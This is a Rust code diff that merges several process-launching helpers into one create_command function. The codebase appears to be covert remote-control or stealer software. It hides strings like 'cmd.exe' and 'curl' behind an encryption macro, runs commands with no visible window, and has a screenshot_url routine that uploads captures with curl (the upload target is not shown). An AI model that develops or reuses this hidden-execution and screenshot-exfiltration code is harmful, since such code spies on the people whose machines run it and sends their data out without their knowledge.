@@ -7,7 +7,7 @@ use std::{
     io,
     io::Cursor,
     path::Path,
-    process::{Command, Output},
+    process::{Command, Output, Child},
     thread,
     time::Duration,
 };
@@ -41,30 +41,7 @@ pub async fn download_from_url(url: &str, path: &str) -> anyhow::Result<()> {
     Ok(())
 }
 
-pub fn run_process_with_output(exe: &str, args: Vec<&str>) -> anyhow::Result<Output> {
-    let mut full_command: Vec<String> = vec![];
-
-    #[cfg(target_os = "windows")]
-    {
-        full_command.push(crypto!("cmd.exe"));
-        full_command.push(crypto!("/c"));
-    }
-
-    full_command.push(exe.to_owned());
-    for arg in args {
-        full_command.push(arg.to_owned());
-    }
-
-    let mut command = Command::new(full_command[0].clone());
-    command.args(full_command[1..full_command.len()].to_vec());
-
-    #[cfg(target_os = "windows")]
-    command.creation_flags(CREATE_NO_WINDOW);
-
-    Ok(command.output()?)
-}
-
-pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
+fn create_command(exe: &str, args: Vec<&str>) -> anyhow::Result<Command> {
     let mut full_command: Vec<String> = vec![];
 
     #[cfg(target_os = "windows")]
@@ -86,6 +63,21 @@ pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()>
 
     #[cfg(target_os = "windows")]
     command.creation_flags(CREATE_NO_WINDOW);
+
+    Ok(command)
+}
+
+pub fn run_process_handle(exe: &str, args: Vec<&str>) -> anyhow::Result<Child> {
+    Ok(create_command(exe,args)?.spawn()?)
+}
+
+pub fn run_process_with_output_wait(exe: &str, args: Vec<&str>) -> anyhow::Result<Output> {
+    Ok(create_command(exe,args)?.output()?)
+}
+
+pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
+
+    let mut command = create_command(exe,args)?;
 
     if wait {
         command.output()?;
@@ -102,26 +94,9 @@ pub fn run_process_with_work_dir(
     wait: bool,
     current_dir: &str,
 ) -> anyhow::Result<()> {
-    let mut full_command: Vec<String> = vec![];
 
-    #[cfg(target_os = "windows")]
-    {
-        full_command.push(crypto!("cmd.exe"));
-        full_command.push(crypto!("/c"));
-        if !wait {
-            full_command.push(crypto!("start"));
-        }
-    }
-
-    full_command.push(exe.to_string());
-    for arg in args {
-        full_command.push(arg.to_string());
-    }
-    let mut command = Command::new(full_command[0].clone());
-    command.args(full_command[1..full_command.len()].to_vec());
+    let mut command = create_command(exe,args)?;
     command.current_dir(current_dir);
-    #[cfg(target_os = "windows")]
-    command.creation_flags(CREATE_NO_WINDOW);
 
     if wait {
         command.output()?;
@@ -196,7 +171,7 @@ pub async fn screenshot_url() -> anyhow::Result<String> {
 
     info_crypt!("Uploading screenshot...");
 
-    let out = utils::run_process_with_output(
+    let out = utils::run_process_with_output_wait(
         &crypto!("curl"),
         vec![
             &crypto!("-F"),
